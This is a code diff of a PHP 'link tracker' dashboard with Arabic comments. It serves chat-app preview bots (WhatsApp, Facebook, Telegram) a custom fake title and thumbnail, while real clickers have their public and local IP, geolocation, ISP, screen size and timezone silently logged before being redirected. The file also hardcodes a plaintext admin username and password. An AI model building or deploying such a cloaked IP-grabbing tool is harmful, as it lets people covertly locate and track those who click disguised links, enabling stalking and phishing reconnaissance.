@@ -8,12 +8,14 @@ session_start();
 $admin_user = "SCLC USER";
 $admin_pass = "aziz2000";
 
+// تسجيل الخروج
 if (isset($_GET['logout'])) {
     session_destroy();
     header("Location: /");
     exit();
 }
 
+// معالجة تسجيل الدخول
 if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['login'])) {
     if (isset($_POST['username']) and isset($_POST['password'])) {
         if ($_POST['username'] === $admin_user and$_POST['password'] === $admin_pass) {$_SESSION['logged_in'] = true;
@@ -28,6 +30,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['login'])) {
 try {
     $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
+    // إنشاء جدول الروابط مع دعم حقول المعاينة
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT UNIQUE, 
@@ -37,6 +40,7 @@ try {
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 
+    // إنشاء جدول السجلات
     $db->exec("CREATE TABLE IF NOT EXISTS logs (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT, 
@@ -106,6 +110,7 @@ function get_ip_details($ip) {
     return ['country' => 'غير معروف', 'city' => 'غير معروف', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'غير معروف'];
 }
 
+// 1. معالجة إعادة التوجيه والتعرف على الروبوتات (فيسبوك وواتساب)
 if (isset($_GET['r'])) {
     $code =$_GET['r'];
     $stmt =$db->prepare("SELECT * FROM links WHERE code = ?");
@@ -116,6 +121,7 @@ if (isset($_GET['r'])) {
         $ua =$_SERVER['HTTP_USER_AGENT'] ?? '';
         $is_bot = preg_match('/whatsapp\vert{}facebookexternalhit\vert{}twitterbot\vert{}telegrambot\vert{}embedly\vert{}quora link preview/i',$ua);
 
+        // إذا كان الزائر هو روبوت الفحص لتطبيقات الدردشة، أظهر له وسوم المعاينة فقط
         if ($is_bot) {$title = !empty($link['preview_title']) ?$link['preview_title'] : 'فيديو حصري';
             $img = !empty($link['preview_image']) ?$link['preview_image'] : 'https://via.placeholder.com/600x400';
             
@@ -128,6 +134,7 @@ if (isset($_GET['r'])) {
             exit();
         }
 
+        // الزائر الحقيقي: تسجيل البيانات والتوجيه للهدف
         $target = $link['target_url'];$public_ip = get_real_ip();
         $local_ip =$_GET['lip'] ?? 'غير متوفر';
         $geo = get_ip_details($public_ip);
@@ -147,6 +154,7 @@ if (isset($_GET['r'])) {
     }
 }
 
+// حماية لوحة التحكم: إذا لم يكن مسجلاً للدخول، أظهر نموذج الدخول
 if (!isset($_SESSION['logged_in']) or$_SESSION['logged_in'] !== true):
 ?>
 <!DOCTYPE html>
@@ -188,13 +196,14 @@ if (!isset($_SESSION['logged_in']) or$_SESSION['logged_in'] !== true):
 exit();
 endif;
 
+// 2. معالجة إنشاء رابط جديد بمعاينة مخصصة
 $generated_link = "";
 $tracking_code = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
     $target_url = trim($_POST['target_url']);
     $preview_title = trim($_POST['preview_title']);
     $preview_image = trim($_POST['preview_image']);
-    
+
     if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
         $target_url = "https://" . $target_url;
     }
@@ -210,6 +219,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
 $total_links =$db->query("SELECT COUNT(*) FROM links")->fetchColumn();
 $total_visits =$db->query("SELECT COUNT(*) FROM logs")->fetchColumn();
 
+// جلب السجلات بناءً على فلتر الكود المدخل
 $filter_code = trim($_GET['track'] ?? '');
 if (!empty($filter_code)) {
     $stmt =$db->prepare("SELECT * FROM logs WHERE code = ? ORDER BY id DESC");
@@ -250,7 +260,7 @@ if (!empty($filter_code)) {
         th { background: #030712; color: #9ca3af; padding: 12px; border-bottom: 1px solid #1f2937; white-space: nowrap; }
         td { padding: 12px; border-bottom: 1px solid #1f2937; color: #e5e7eb; white-space: nowrap; }
         tr:hover { background: rgba(31, 41, 55, 0.4); }
-        .badge { background: #064e3b; color: #34d399; padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: bold; }
+        .badge { background: #064e3b; color: #34d399; padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: bold; border: 1px solid #065f46; }
         .ip-public { font-family: monospace; color: #38bdf8; font-weight: bold; }
         .ip-local { font-family: monospace; color: #34d399; font-weight: bold; }
         .copy-btn { background: #374151; padding: 6px 10px; font-size: 11px; border-radius: 4px; cursor: pointer; color: #fff; border: none; }
@@ -265,7 +275,6 @@ if (!empty($filter_code)) {
             const redirectCode = urlParams.get('r');
             const hasScreen = urlParams.has('screen');
 
-            // تم تصحيح الرمز هنا لاستخدام && بدلاً من كلمة and البرمجية
             if (redirectCode && !hasScreen) {
                 const screenRes = screen.width + "x" + screen.height;
                 const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -292,7 +301,7 @@ if (!empty($filter_code)) {
         <div class="card header">
             <div>
                 <h1>Hello World from azez</h1>
-                <p style="color: #9ca3af; font-size: 12px; margin-top: 2px;">لوحة تحكم محمية خاصة بالمسؤول</p>
+                <p style="color: #9ca3af; font-size: 12px; margin-top: 2px;">لوحة تحكم تتبع الروابط المتقدمة (فيسبوك وواتساب)</p>
             </div>
             <div class="stats-group">
                 <div class="stat-box">
@@ -308,11 +317,11 @@ if (!empty($filter_code)) {
         </div>
 
         <div class="card">
-            <h2>🔗 إنشاء رابط تتبع بمعاينة مخصصة (فيسبوك وواتساب)</h2>
-            <form method="POST" class="form-group" style="flex-direction: column;">
+            <h2>🔗 إنشاء رابط تتبع جديد بمعاينة مخصصة</h2>
+            <form method="POST" class="form-group">
                 <input type="text" name="target_url" placeholder="الرابط المستهدف الحقيقي (مثال: youtube.com)" required>
-                <input type="text" name="preview_title" placeholder="عنوان المعاينة (مثال: شاهد هذا الفيديو)">
-                <input type="text" name="preview_image" placeholder="رابط صورة أو مصغرة الفيديو المباشرة">
+                <input type="text" name="preview_title" placeholder="عنوان المعاينة (اختياري)">
+                <input type="text" name="preview_image" placeholder="رابط صورة أو مصغرة الفيديو المباشرة (اختياري)">
                 <button type="submit" name="create" style="width: 100%;">توليد الرابط</button>
             </form>
 
@@ -338,7 +347,7 @@ if (!empty($filter_code)) {
             <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; margin-bottom: 10px;">
                 <h2>📊 سجلات الزيارات الحية</h2>
                 <form method="GET" style="display: flex; gap: 5px; margin: 0; width: 100%; max-width: 300px;">
-                    <input type="text" name="track" placeholder="بحث بالكود..." value="<?php echo htmlspecialchars($filter_code); ?>" style="padding: 8px; font-size: 12px;">
+                    <input type="text" name="track" placeholder="بحث بكود التتبع القديم..." value="<?php echo htmlspecialchars($filter_code); ?>" style="padding: 8px; font-size: 12px;">
                     <button type="submit" style="padding: 8px 12px; font-size: 12px;">بحث</button>
                     <?php if(!empty($filter_code)): ?>
                         <a href="/" class="btn" style="background: #dc2626; padding: 8px 10px; font-size: 12px;">إلغاء</a>
@@ -363,7 +372,7 @@ if (!empty($filter_code)) {
                     </thead>
                     <tbody>
                         <?php if (empty($logs)): ?>
-                            <tr><td colspan="9" style="text-align: center; color: #6b7280; padding: 25px;">لا توجد أي زيارات مسجلة حتى الآن.</td></tr>
+                            <tr><td colspan="9" style="text-align: center; color: #6b7280; padding: 25px;">لا توجد أي زيارات مسجلة لهذا الكود حتى الآن.</td></tr>
                         <?php else: ?>
                             <?php foreach ($logs as$log): ?>
                             <tr>
